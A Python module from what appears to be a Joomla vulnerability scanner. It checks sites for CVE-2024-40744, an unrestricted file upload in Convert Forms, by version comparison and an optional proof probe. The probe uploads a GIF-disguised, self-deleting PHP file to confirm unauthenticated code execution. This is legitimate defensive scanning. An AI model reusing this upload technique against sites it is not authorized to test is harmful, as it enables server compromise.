from __future__ import annotations

from typing import Any

from ...core.models import Finding
from ...core.probes import rand_str
from ...core.versions import parse_version_safe
from .convertforms_probe import probe_upload

CVE_ID = "CVE-2024-40744"
NAME = "Convert Forms unrestricted file upload"
COMPONENT = "Convert Forms"
AFFECTED_RULE = "Convert Forms before 4.4.8"
PATCHED_VERSION = "4.4.8"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe(PATCHED_VERSION)
    if parsed is None or fixed is None:
        return "INCONCLUSIVE"
    return "LIKELY_VULNERABLE" if parsed < fixed else "PATCHED"


def passive_check(
    target_url: str,
    joomla_version: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    plugin = (plugins or {}).get("convertforms", {})
    if not plugin.get("found"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Convert Forms was not detected through its public manifest or component route.",
            action="Verify manually if Convert Forms is installed behind restricted routes.",
        )

    version = plugin.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Convert Forms {version}, which is below the fixed release."
        action = "Upgrade Convert Forms to 4.4.8 or newer and inspect upload locations for unexpected files."
        confidence = "HIGH"
    elif status == "PATCHED":
        detail = f"Detected Convert Forms {version}, which is outside the published affected range."
        action = "Keep Convert Forms updated."
        confidence = "HIGH"
    else:
        detail = (
            f"Convert Forms was detected at {plugin.get('source', 'an unknown source')}, but its version is unknown."
        )
        action = "Determine the installed version and upgrade to 4.4.8 or newer."
        confidence = "MEDIUM"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
    )


def run_safe_probe(
    target_url: str,
    plugins: dict[str, Any] | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    passive = passive_check(target_url, plugins=plugins)
    if passive.status != "LIKELY_VULNERABLE":
        passive.detail += " Safe proof skipped because the detected version is not in the affected range."
        return passive

    marker = f"PROOFCMS_CF_{rand_str(12)}"
    expected = f"{marker}_144"
    filename = f"proofcms-{rand_str(8)}.php"
    payload = (f"GIF89a<?php echo '{marker}_'.(12*12); @unlink(__FILE__); ?>").encode()
    proof = probe_upload(
        target_url,
        filename=filename,
        payload=payload,
        content_type="image/gif",
        timeout=timeout,
        proxy=proxy,
    )
    passive.exploit_ran = True
    if not proof.get("accepted"):
        passive.status = "NOT_CONFIRMED"
        passive.confidence = "MEDIUM"
        passive.detail = (
            "No dangerous upload was confirmed through a public Convert Forms file-upload field. "
            f"Fields discovered: {proof.get('fields_found', 0)}. "
            f"Attempts: {'; '.join(proof.get('attempts', [])) or 'none'}."
        )
        return passive

    response_body = proof["response"].get("body", "")
    passive.proof_url = proof["proof_url"]
    passive.uploaded_filename = proof["uploaded_filename"]
    if expected in response_body and "<?php" not in response_body:
        passive.status = "VULNERABLE"
        passive.confidence = "CONFIRMED"
        passive.detail = (
            "Unauthenticated PHP upload and execution were confirmed with a runtime math marker. "
            "The proof script requested self-deletion after execution."
        )
        passive.action = "Upgrade Convert Forms to 4.4.8 or newer and verify that the temporary proof file was deleted."
        return passive

    passive.status = "VULNERABLE_UPLOAD_ONLY"
    passive.confidence = "CONFIRMED"
    passive.detail = (
        "A disallowed PHP-named file was accepted and retrieved from the web-accessible Joomla temporary directory, "
        "but PHP execution was not observed."
    )
    passive.action = f"Upgrade Convert Forms to 4.4.8 or newer and delete {proof['uploaded_filename']} from the Joomla temporary directory."
    return passive


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    plugins: dict[str, Any] | None = None,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
) -> Finding:
    if run_exploit_check:
        if exploit_mode != "safe":
            result = passive_check(target_url, joomla_version, plugins=plugins)
            result.detail += " This module only supports safe verification."
            return result
        return run_safe_probe(target_url, plugins=plugins, timeout=timeout, proxy=proxy)
    return passive_check(target_url, joomla_version, plugins=plugins)


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": ["convertforms"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-40744",
            "https://www.tassos.gr/joomla-extensions/convert-forms",
        ],
    }
